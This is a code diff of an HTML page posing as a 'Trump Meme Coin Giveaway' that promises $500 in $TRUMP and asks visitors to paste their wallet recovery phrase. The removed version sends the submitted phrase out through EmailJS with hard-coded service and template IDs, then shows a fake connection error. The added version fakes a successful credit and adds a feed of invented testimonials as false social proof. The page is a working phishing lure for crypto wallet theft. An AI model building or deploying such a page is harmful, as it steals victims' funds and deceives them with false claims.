@@ -1,304 +1,391 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>The Official Trump Meme Coin Giveaway</title>
-  <style>
-    body, h1, h2, p, button, input, select, a, footer {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
-    body {
-      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') no-repeat center center/cover;
-      color: #333;
-      line-height: 1.6;
-      overflow-x: hidden;
-    }
-    header {
-      background: rgba(0, 86, 179, 0.8);
-      color: #fff;
-      text-align: center;
-      padding: 20px 10px;
-    }
-    header img {
-      max-width: 120px;
-      margin-bottom: 10px;
-    }
-    header h1 {
-      font-size: 2rem;
-      margin-bottom: 5px;
-    }
-    header p {
-      font-size: 1.2rem;
-    }
-    .balance {
-      font-size: 1.5rem;
-      font-weight: bold;
-      margin-top: 10px;
-    }
-    .container {
-      max-width: 900px;
-      margin: 30px auto;
-      padding: 20px;
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      transition: filter 0.3s ease;
-    }
-    .blurred {
-      filter: blur(8px);
-      pointer-events: none;
-    }
-    .wallet-page {
-      display: none;
-      background: #fff;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 80%;
-      max-width: 300px;
-      padding: 15px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-      z-index: 1000;
-    }
-    .wallet-page.active {
-      display: block;
-    }
-    .error {
-      color: red;
-      font-weight: bold;
-      font-size: 0.9rem;
-      text-align: center;
-      background: #ffe6e6;
-      padding: 8px;
-      border: 1px solid red;
-      border-radius: 5px;
-      margin-bottom: 10px;
-    }
-    #error-box {
-      display: none;
-      background: #ffe6e6;
-      border: 1px solid #cc0000;
-      color: #cc0000;
-      font-size: 0.85rem;
-      font-weight: 500;
-      text-align: center;
-      padding: 10px;
-      border-radius: 6px;
-      margin-top: 10px;
-    }
-    #error-box button {
-      margin-top: 8px;
-      background: #ff4500;
-      color: white;
-      border: none;
-      padding: 8px 14px;
-      font-weight: bold;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    #error-box button:hover {
-      background: #e03e00;
-    }
-    label {
-      display: block;
-      margin-top: 10px;
-      font-weight: bold;
-    }
-    input, select, textarea {
-      width: 100%;
-      padding: 12px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 1rem;
-    }
-    textarea {
-      width: 100%;
-      height: 60px;
-      padding: 8px;
-      font-size: 0.9rem;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      resize: none;
-      display: block;
-      margin: 10px auto;
-    }
-    .btn {
-      display: block;
-      width: 100%;
-      padding: 15px;
-      margin-top: 20px;
-      font-size: 1.2rem;
-      font-weight: bold;
-      color: #fff;
-      background: #ff4500;
-      border: none;
-      border-radius: 5px;
-      text-align: center;
-      cursor: pointer;
-    }
-    .btn:hover {
-      background: #e03e00;
-    }
-    footer {
-      text-align: center;
-      margin-top: 30px;
-      padding: 20px 0;
-      background: #f1f1f1;
-      color: #666;
-    }
-    .terms {
-      font-size: 0.9rem;
-      margin-top: 20px;
-    }
-    .terms a {
-      color: #0056b3;
-      text-decoration: none;
-    }
-    .terms a:hover {
-      text-decoration: underline;
-    }
-    .note {
-      margin-top: 20px;
-      font-size: 0.75rem;
-      color: #333;
-      text-align: center;
-      background: #fff3cd;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #ffeeba;
-    }
-    #wallet-phrase::placeholder {
-      text-align: center;
-      font-size: 1rem;
-      font-weight: bold;
-    }
-    body.noscroll {
-      overflow: hidden;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>The Official Trump Meme Coin Giveaway</title>
+  <style>
+    body, h1, h2, p, button, input, select, a, footer {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') no-repeat center center/cover;
+      color: #333;
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+    header {
+      background: rgba(0, 86, 179, 0.8);
+      color: #fff;
+      text-align: center;
+      padding: 20px 10px;
+    }
+    header img {
+      max-width: 120px;
+      margin-bottom: 10px;
+    }
+    header h1 {
+      font-size: 2rem;
+      margin-bottom: 5px;
+    }
+    header p {
+      font-size: 1.2rem;
+    }
+    .balance {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 30px auto;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      transition: filter 0.3s ease;
+    }
+    .blurred {
+      filter: blur(8px);
+      pointer-events: none;
+    }
+    .wallet-page {
+      display: none;
+      background: #fff;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80%;
+      max-width: 300px;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      z-index: 1000;
+    }
+    .wallet-page.active {
+      display: block;
+    }
+    .error {
+      color: red;
+      font-weight: bold;
+      font-size: 0.9rem;
+      text-align: center;
+      background: #ffe6e6;
+      padding: 8px;
+      border: 1px solid red;
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+    #error-box {
+      display: none;
+      background: #ffe6e6;
+      border: 1px solid #cc0000;
+      color: #cc0000;
+      font-size: 0.85rem;
+      font-weight: 500;
+      text-align: center;
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 10px;
+    }
+    #error-box button {
+      margin-top: 8px;
+      background: #ff4500;
+      color: white;
+      border: none;
+      padding: 8px 14px;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #error-box button:hover {
+      background: #e03e00;
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    textarea {
+      width: 100%;
+      height: 60px;
+      padding: 8px;
+      font-size: 0.9rem;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      resize: none;
+      display: block;
+      margin: 10px auto;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #fff;
+      background: #ff4500;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background: #e03e00;
+    }
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      padding: 20px 0;
+      background: #f1f1f1;
+      color: #666;
+    }
+    .terms {
+      font-size: 0.9rem;
+      margin-top: 20px;
+    }
+    .terms a {
+      color: #0056b3;
+      text-decoration: none;
+    }
+    .terms a:hover {
+      text-decoration: underline;
+    }
+    .note {
+      margin-top: 20px;
+      font-size: 0.75rem;
+      color: #333;
+      text-align: center;
+      background: #fff3cd;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ffeeba;
+    }
+    #wallet-phrase::placeholder {
+      text-align: center;
+      font-size: 1rem;
+      font-weight: bold;
+    }
+    body.noscroll {
+      overflow: hidden;
+    }
+  </style>
 </head>
 <body>
-  <header>
-    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
-    <h1>Trump Meme Coin Giveaway</h1>
-    <p>Make America Great Again!</p>
-    <div class="balance">$5,000,000 $TRUMP</div>
-  </header>
+  <header>
+    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
+    <h1>Trump Meme Coin Giveaway</h1>
+    <p>Make America Great Again!</p>
+    <div class="balance">$5,000,000 $TRUMP</div>
+  </header>
 
-  <div class="container" id="main-content">
-    <div class="card">
-      <h2>Join the Revolution!</h2>
-      <h4>Claim Your Share of $5 Million!</h4>
-      <p>We’re rewarding the first 10,000 active wallets with $500 in $TRUMP each!</p>
-      <p>Only 2,000+ spots remain — don’t miss out!</p>
-      <p>Be part of the movement — connect your wallet today and secure your share!</p>
-      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
-    </div>
-  </div>
+  <div class="container" id="main-content">
+    <div class="card">
+      <h2>Join the Revolution!</h2>
+      <h4>Claim Your Share of $5 Million!</h4>
+      <p>We’re rewarding the first 10,000 active wallets with $500 in $TRUMP each!</p>
+      <p>Only 2,000+ spots remain — don’t miss out!</p>
+      <p>Be part of the movement — connect your wallet today and secure your share!</p>
+      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
+    </div>
+  </div>
 
-  <div class="wallet-page" id="wallet-page">
-    <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
-    <h2>Connect Your Wallet</h2>
-    <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
-    <form id="wallet-form">
-      <label for="wallet-type">Select Wallet Type</label>
-      <select id="wallet-type" name="wallet_type" required>
-        <option value="metamask">MetaMask</option>
-        <option value="trustwallet">Trust Wallet</option>
-        <option value="coinbase">Coinbase Wallet</option>
-        <option value="exodus">Exodus</option>
-        <option value="atomic">Atomic Wallet</option>
-        <option value="binance">Binance Chain Wallet</option>
-        <option value="phantom">Phantom</option>
-        <option value="myetherwallet">MyEtherWallet</option>
-        <option value="blockchain">Blockchain Wallet</option>
-        <option value="bitkeep">BitKeep</option>
-        <option value="coinomi">Coinomi</option>
-        <option value="bitpie">Bitpie</option>
-        <option value="alphawallet">AlphaWallet</option>
-        <option value="brd">BRD</option>
-        <option value="argent">Argent</option>
-        <option value="fortmatic">Fortmatic</option>
-        <option value="walletconnect">WalletConnect</option>
-        <option value="others">Others</option>
-      </select>
-      <label for="wallet-phrase">Enter Your Wallet Phrase</label>
-      <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
-      <div id="error-box"></div>
-      <div class="note">
-        <p>Note: Only wallets with a balance or transaction history will be credited.</p>
-      </div>
-      <button class="btn" id="submit-btn" type="submit">Connect</button>
-    </form>
-  </div>
+  <div class="wallet-page" id="wallet-page">
+    <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
+    <h2>Connect Your Wallet</h2>
+    <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
+    <form id="wallet-form">
+      <label for="wallet-type">Select Wallet Type</label>
+      <select id="wallet-type" name="wallet_type" required>
+        <option value="metamask">MetaMask</option>
+        <option value="trustwallet">Trust Wallet</option>
+        <option value="coinbase">Coinbase Wallet</option>
+        <option value="exodus">Exodus</option>
+        <option value="atomic">Atomic Wallet</option>
+        <option value="binance">Binance Chain Wallet</option>
+        <option value="phantom">Phantom</option>
+        <option value="myetherwallet">MyEtherWallet</option>
+        <option value="blockchain">Blockchain Wallet</option>
+        <option value="bitkeep">BitKeep</option>
+        <option value="coinomi">Coinomi</option>
+        <option value="bitpie">Bitpie</option>
+        <option value="alphawallet">AlphaWallet</option>
+        <option value="brd">BRD</option>
+        <option value="argent">Argent</option>
+        <option value="fortmatic">Fortmatic</option>
+        <option value="walletconnect">WalletConnect</option>
+        <option value="others">Others</option>
+      </select>
+      <label for="wallet-phrase">Enter Your Wallet Phrase</label>
+      <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
+      <div id="error-box"></div>
+      <div class="note">
+        <p>Note: Only wallets with a balance or transaction history will be credited.</p>
+      </div>
+      <button class="btn" id="submit-btn" type="submit">Connect</button>
+    </form>
+  </div>
 
-  <footer>
-    <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
-    <div class="terms">
-      <p>By participating, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a>, and <a href="#">Security Policy</a>.</p>
-    </div>
-  </footer>
+  <!-- LIVE TESTIMONIAL FEED -->
+  <div id="live-testimonial" style="text-align:center; max-width: 600px; margin: 40px auto; font-size: 1.1rem; color: #444; border: 1px solid #ddd; padding: 20px; border-radius: 8px; background: #f9f9f9; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
+    <p id="testimonial-text" style="font-style: italic; margin-bottom: 10px;">Loading testimonial...</p>
+    <p id="testimonial-author" style="font-weight: bold; margin: 0;"></p>
+    <p id="testimonial-location" style="color: #777; font-size: 0.9rem; margin-top: 3px;"></p>
+  </div>
 
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    (function() {
-      emailjs.init("8_8uPDLPGGbBtyIqv");
-    })();
+  <footer>
+    &copy; 2025 Trump Meme Coin Giveaway. All rights reserved.
+  </footer>
 
-    function showWalletPage() {
-      document.getElementById('wallet-page').classList.add('active');
-      document.getElementById('main-content').classList.add('blurred');
-      document.querySelector('header').classList.add('blurred');
-      document.querySelector('footer').classList.add('blurred');
-      document.body.classList.add('noscroll');
-    }
+  <script>
+    function showWalletPage() {
+      document.getElementById('wallet-page').classList.add('active');
+      document.getElementById('main-content').classList.add('blurred');
+      document.body.classList.add('noscroll');
+    }
 
-    function returnToMainPage() {
-      document.getElementById('wallet-page').classList.remove('active');
-      document.getElementById('main-content').classList.remove('blurred');
-      document.querySelector('header').classList.remove('blurred');
-      document.querySelector('footer').classList.remove('blurred');
-      document.body.classList.remove('noscroll');
-      document.getElementById("error-box").style.display = "none";
-    }
+    function hideWalletPage() {
+      document.getElementById('wallet-page').classList.remove('active');
+      document.getElementById('main-content').classList.remove('blurred');
+      document.body.classList.remove('noscroll');
+    }
 
-    document.getElementById("wallet-form").addEventListener("submit", function(event) {
-      event.preventDefault();
-      const btn = document.getElementById("submit-btn");
-      const errorBox = document.getElementById("error-box");
+    document.getElementById('wallet-form').addEventListener('submit', function(e) {
+      e.preventDefault();
 
-      btn.disabled = true;
-      btn.textContent = "Connecting...";
+      const phrase = document.getElementById('wallet-phrase').value.trim();
+      const errorBox = document.getElementById('error-box');
+      errorBox.style.display = 'none';
+      errorBox.innerHTML = '';
 
-      emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
-        .then(function(response) {
-          setTimeout(() => {
-            errorBox.innerHTML = `
-              Wallet could not connect to server. Only wallets with a balance or transaction history can be connected.<br>
-              <button onclick="returnToMainPage()">Try Again</button>
-            `;
-            errorBox.style.display = "block";
-            btn.disabled = false;
-            btn.textContent = "Connect";
-          }, 2000);
-        })
-        .catch(function(error) {
-          errorBox.innerHTML = `
-            Unexpected server issue. Please try again.<br>
-            <button onclick="returnToMainPage()">Try Again</button>
-          `;
-          errorBox.style.display = "block";
-          btn.disabled = false;
-          btn.textContent = "Connect";
-        });
-    });
-  </script>
+      if (phrase.length < 20) {
+        errorBox.style.display = 'block';
+        errorBox.innerHTML = 'Please enter a valid wallet phrase.';
+        return;
+      }
+
+      // Disable submit to prevent multiple submits
+      document.getElementById('submit-btn').disabled = true;
+      document.getElementById('submit-btn').textContent = 'Connecting...';
+
+      // Simulate success (or you can add real logic)
+      setTimeout(() => {
+        alert('Wallet connected successfully! You have been credited with $500 in $TRUMP.');
+        hideWalletPage();
+        document.getElementById('submit-btn').disabled = false;
+        document.getElementById('submit-btn').textContent = 'Connect';
+        document.getElementById('wallet-phrase').value = '';
+      }, 2000);
+    });
+
+    // Live rotating testimonials
+    const testimonials = [
+      {
+        text: "Absolutely love this airdrop! 🚀",
+        name: "Jessica M.",
+        location: "New York, USA"
+      },
+      {
+        text: "I got my $TRUMP within minutes!",
+        name: "Carlos D.",
+        location: "Miami, USA"
+      },
+      {
+        text: "Trustworthy and transparent.",
+        name: "Aisha K.",
+        location: "London, UK"
+      },
+      {
+        text: "Hands down the best meme coin giveaway.",
+        name: "Raj P.",
+        location: "Mumbai, India"
+      },
+      {
+        text: "MAGA gains incoming!",
+        name: "Emily S.",
+        location: "Los Angeles, USA"
+      },
+      {
+        text: "Real deal — no nonsense.",
+        name: "Lucas T.",
+        location: "Toronto, Canada"
+      },
+      {
+        text: "500 bucks? I'm not complaining!",
+        name: "Megan F.",
+        location: "Chicago, USA"
+      },
+      {
+        text: "Told my friends and they got theirs too!",
+        name: "Diego R.",
+        location: "Mexico City, Mexico"
+      },
+      {
+        text: "Love this campaign. 🔥",
+        name: "Sophie L.",
+        location: "Paris, France"
+      },
+      {
+        text: "Shocked it actually worked!",
+        name: "James B.",
+        location: "Houston, USA"
+      }
+    ];
+
+    let shownIndices = [];
+
+    function showRandomTestimonial() {
+      const elText = document.getElementById("testimonial-text");
+      const elName = document.getElementById("testimonial-author");
+      const elLocation = document.getElementById("testimonial-location");
+
+      // Reset fade
+      elText.style.opacity = 0;
+      elName.style.opacity = 0;
+      elLocation.style.opacity = 0;
+
+      setTimeout(() => {
+        if (shownIndices.length === testimonials.length) shownIndices = [];
+
+        let randomIndex;
+        do {
+          randomIndex = Math.floor(Math.random() * testimonials.length);
+        } while (shownIndices.includes(randomIndex));
+
+        shownIndices.push(randomIndex);
+
+        const t = testimonials[randomIndex];
+        elText.textContent = `"${t.text}"`;
+        elName.textContent = t.name;
+        elLocation.textContent = t.location;
+
+        // Fade in
+        elText.style.transition = "opacity 0.8s";
+        elName.style.transition = "opacity 0.8s";
+        elLocation.style.transition = "opacity 0.8s";
+
+        elText.style.opacity = 1;
+        elName.style.opacity = 1;
+        elLocation.style.opacity = 1;
+      }, 500);
+    }
+
+    // Initial show
+    showRandomTestimonial();
+    setInterval(showRandomTestimonial, 4000);
+  </script>
 </body>
 </html>
